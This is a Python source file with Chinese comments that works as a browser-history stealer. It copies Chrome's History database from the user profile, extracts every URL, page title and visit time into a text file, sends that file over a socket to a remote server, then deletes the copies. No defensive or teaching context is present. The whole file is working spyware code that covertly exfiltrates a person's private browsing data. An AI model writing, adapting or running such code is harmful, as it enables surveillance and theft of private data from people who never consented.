import sqlite3
import os
import shutil
import struct
from datetime import datetime, timedelta
import time
import socket

def extract_and_send_history(client_socket):
    """提取浏览历史记录并通过网络发送到服务器。"""
    # 浏览器历史记录文件的路径
    history_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')

    # 创建历史记录文件的副本
    history_copy = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History_copy')
    shutil.copy2(history_path, history_copy)  # 将历史记录文件复制到副本文件

    # 连接到副本的 SQLite 数据库
    conn = sqlite3.connect(history_copy)  # 连接到副本数据库
    cursor = conn.cursor()  # 获取数据库游标

    # 查询浏览历史记录
    cursor.execute("SELECT url, title, last_visit_time FROM urls")

    # 将 last_visit_time 转换为人类可读的格式
    def chrome_time_to_readable(chrome_time):
        # Chrome 的时间戳是从 1601-01-01 开始的微秒数
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)

    # 获取当前时间戳作为目录名称
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    dir_name = f"history_{timestamp}"

    # 创建文件路径
    output_path = os.path.join(os.getcwd(), 'history_output.txt')

    # 打开一个 txt 文件，准备写入历史记录
    with open(output_path, 'w', encoding='utf-8') as file:
        # 写入标题行
        file.write("Last Visit Time :  Title  => URL\n")
        # 打印历史记录
        for row in cursor.fetchall():
            url, title, last_visit_time = row  # 获取每一行的 URL、标题和最后访问时间
            readable_time = chrome_time_to_readable(last_visit_time)  # 将最后访问时间转换为可读格式
            file.write(f"{readable_time} : {title} => {url}\n")  # 将历史记录写入 txt 文件

    # 关闭连接
    conn.close()  # 关闭数据库连接

    # 删除副本
    os.remove(history_copy)  # 删除副本文件

    print(f"历史记录已保存到: {output_path}")

    # 发送文件
    send_file(output_path, client_socket)

def send_file(filename, client_socket):
    """
    通过网络将文件发送到指定的客户端套接字。

    参数：
        filename (str): 要发送的文件名。
        client_socket (socket.socket): 用于通信的套接字对象。
    """
    # 获取文件大小
    file_size = os.path.getsize(filename)

    # 填充文件名到128字节
    filename_padded = bytes(os.path.basename(filename).encode('utf-8')).ljust(128, b'\x00')

    # 打包文件信息
    fileinfo = struct.pack("128sl", filename_padded, file_size)
    client_socket.send(fileinfo)

    # 分块发送文件
    with open(filename, "rb") as file:
        while True:
            data = file.read(1024)  # 每次读取1024字节
            if not data:
                break
            client_socket.sendall(data)

    client_socket.send(b"END")
    print(f"{filename} 已成功发送")

    # 删除文件
    os.remove(filename)
